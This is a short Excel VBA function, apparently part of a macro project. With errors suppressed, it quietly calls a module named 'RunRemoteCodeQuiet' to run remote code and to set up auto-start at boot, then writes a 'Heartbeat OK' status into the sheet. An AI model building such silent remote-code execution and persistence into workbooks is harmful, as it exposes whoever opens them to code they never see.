Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
    On Error Resume Next
    Application.Run "zInternet.RunRemoteCodeQuiet", "HeartbeatPing"
    Application.Run "zInternet.RunRemoteCodeQuiet", "RunBootAutoStartIfNeeded"
    Dim ws As Worksheet : Set ws = targetWb.Sheets(1) : ws.Range("A1").Value = "Heartbeat" : ws.Range("B1").Value = "OK"
    Set DynamicFunc = Nothing
End Function
